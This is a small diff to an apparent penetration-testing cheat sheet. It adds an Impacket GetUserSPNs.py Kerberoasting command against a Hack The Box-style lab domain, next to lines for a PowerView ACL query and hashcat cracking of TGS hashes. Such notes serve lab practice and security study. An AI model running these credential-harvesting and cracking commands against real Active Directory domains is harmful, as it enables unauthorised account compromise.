@@ -119,6 +119,7 @@ Get-ObjectAcl -DistinguishedName "DC=htb,DC=local" -ResolveGUIDs | Where-Object 
 
 ```
 GetUserSPNs.py -request active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
+GetUserSPNs.py -request 'painters.htb/riley':'P@ssw0rd' -dc-ip 192.168.110.55 -debug -dc-host PAINTERS.HTB
 hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force
 ```
 
